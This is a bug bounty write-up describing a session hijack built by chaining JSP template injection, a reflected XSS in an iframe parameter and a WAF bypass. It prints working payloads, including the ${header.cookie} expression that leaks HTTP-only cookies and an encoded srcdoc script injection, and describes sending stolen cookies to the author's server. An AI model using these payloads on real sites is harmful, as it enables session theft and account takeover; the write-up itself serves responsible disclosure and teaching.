# :game_die: Bug Bounty Writeup: $2500 Reward for Session Hijack via Chained Attack

---

# Bug Bounty Writeup: $2500 Reward for Session Hijack via Chained Attack

A detailed Bug Bounty Writeup explaining a session hijack vulnerability that was exploited using Cross-Site Scripting (XSS), coupled with a Web Application Firewall (WAF) bypass and Server-Side Template Injection (SSTI). This in-depth analysis explores how these chained vulnerabilities were discovered, earning a $2500 reward.

*Session Hijack via Chained Attack*

Hello 👋

First of all, I’d like to thank [Martin Sparre-Enger](https://www.linkedin.com/in/mse89/) for sponsoring this Bug Bounty Writeup through my [BuyMeACoffee](https://www.buymeacoffee.com/therceman/wishlist) page.

Let’s dive in …

I’d been exploring a website for some time, uncovering a few bugs here and there, but I was curious to see if there was more to discover.

As usual, this involved navigating through all links and sections while keeping the Logger++ extension of my Burp Suite active.

After a while, I stumbled upon an interesting redirect URL that looked something like this: `https://example.com?redirect=${redirectURL}`

The last part caught my eye. It was clearly some kind of Template Language Expression that hadn’t been executed correctly. After noting this, I switched to the user profile page and began experimenting with the requests responsible for changing my username.

The first thing I tried was a mathematical expression `${2*2}`, to confirm the potential template injection vulnerability.

I changed my name to `John${2*2}`, and when the response output was `John4`, this confirmed the presence of a Server-Side Template Expression Language.

But what was it exactly? And what could I do with it?

After some time, I determined that it was the [JSP Expression Language](https://dotnettutorials.net/lesson/expression-language-jsp), and I found a few examples to test, thereby confirming its presence.

I think I spent several days, maybe even a week, reading documentation and examples, and trying out different functions and methods. The most interesting expression I found was `${header.cookie}`.By using this payload in your name you’ll receive a list of all cookies, including secured HTTP-only ones.

Upon discovering this SSTI (Server-Side Template Injection) vulnerability with cookies exfiltration payload, I decided to halt further exploration of the documentation and proceed with creating a PoC to demonstrate a Session Hijack vulnerability.

But… I’d overlooked one aspect… How could I perform a Session Hijack on another account without any interaction, or perhaps with at least minimal interaction?

As you might guess, we need a working XSS (Cross-Site Scripting) vulnerability that could change the victim’s name to `${header.cookie}`, and then exfiltrate (forward) all cookies to a domain under our control, thereby demonstrating the full impact of the vulnerability chain.

So, I started digging through the website for potential XSS vulnerabilities…

I had been inspecting the JS source code on the main page, switching to other pages, and repeating the process, but found nothing… until one day.

Accidentally, I clicked on something on the main page (maybe something had changed there, I’m not sure) and was redirected to a page with videos.

Opening the video, which appeared to be a live stream or a recording of one, I noticed an ‘id’ parameter in the URL, something like `videoId=w6exeqbemte`

The first, and most common, idea that came to mind was to append my favorite payload to the end of the parameter.

```
https://example.com/videos/?videoId=w6exeqbemteqwe'"<X</
```

After that, no video loaded, and an examination of the source code revealed that the `videoId` parameter was directly injected into the `src` attribute of the <iframe> element. My additional payload, `<x</`, had become an HTML attribute.

```
<iframe src="w6exeqbemteqwe'" <X</">
```

This was a good sign. It appeared that I had found a potential place for an XSS attack.

The next thing I tried was applying the following payload to this parameter.

```
?videoId=qwe"><img src onerror=alert(1)>
```

And… it was blocked by WAF :)

I knew this website had the most robust WAF I’d ever encountered, but… was it truly that strong?

## Get Anton (therceman)’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

All the classic payloads didn’t work here, I’ve spent a few days trying every possible trick that I know which turned into nothing…

Then I switched my approach and told myself — let’s try to keep our payload inside of an iframe tag and try experimenting further. We can’t override `src` attribute, all the class events like `onload` , `onmouseover` etc … are blocked by WAF.

But… the `srcdoc` param was not blocked by WAF.

This is where the battle with the WAF began :D

I knew that the basic XSS payload wouldn’t work within the ‘`srcdoc`’ parameter, just like before, since the WAF detected everything in the same way. I needed to somehow outsmart it…

I don’t remember exactly which part of the bypass was first, but to create the <script> tag inside an iframe, I utilized this payload:

```
?videoId=qwe"srcdoc="\u003ce<script%26Tab;e>"
```

This payload bypasses the WAF and creates a <script> tag.

The first part of the payload `\u003ce` tricks WAF with the fake opening of a non-existing tag `<e` . The issue with a WAF is that it attempts to decode everything first and then performs checks. In our case, the WAF will convert the Unicode text to a tag `<e` for a check. However, in reality, it remains as a text ‘`\u003ce`’ and doesn’t interfere with the opening of our script tag.

The second part of the payload, `%26Tab;e`(`&Tab;`), is needed to trick the WAF into believing we are not using the script tag, but something else. Typically, WAFs check the entire word or the full <script> tag.

Sometimes, this type of WAF can be bypassed by separating the word and the closing bracket with space and another attribute, like `<script x>`. However, this method was ineffective here — the WAF was smarter :) So, I added an encoded tab `&Tab;`between them instead of just a space.
P.S. `&NewLine;` would work too.

I didn’t wish to extend my experimentation further, so I appended the ‘src’ attribute to the script I had created and closed the tag using the same technique.

```
qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
```

After I found the XSS, it took just a few hours to prepare my final JavaScript code. As I mentioned earlier, it forced the user to update their name to `${header.cookie}`. Following this request, it fetched the page content with the new name, which contained all cookies, and transmitted everything to my VPS. I shared the link to this VPS with the team later.

But… this wasn’t the end for me :) I aimed to increase the impact by transforming the basic XSS into a Stored-XSS, targeting not only logged-in users but also those logged out.

To convert any XSS (even Self-XSS) into Stored-XSS, you simply need to find a method. This could be a Cache Poisoning attack, where you store your XSS in the server cache, or a Cookie/Local Storage-based Stored-XSS, where you leverage XSS to overwrite Cookie or Local Storage values. These values, when later reflected on the page without sanitization, can be exploited.

It took me a few minutes to find an unsanitized, reflected value from the local storage that is accessible to all users, even those who are currently logged out. Consequently, I updated my JavaScript code to include a payload in the Local Storage. This payload performs a loop that checks when the user has an active session and then initiates cookie exfiltration.

I dedicated a few hours to creating a detailed PoC, complete with a video, and subsequently submitted it, hoping it would not end up being a duplicate.

After a day, it was triaged, and within 4–6 days, it was rewarded with a $2500 bounty.

The End :)

P.S. Don’t hesitate to put in extra time on an application. As you can see, some of the best and most rewarding bugs are often hidden beneath the surface.

Thanks for Reading & Happy Hunting!

---
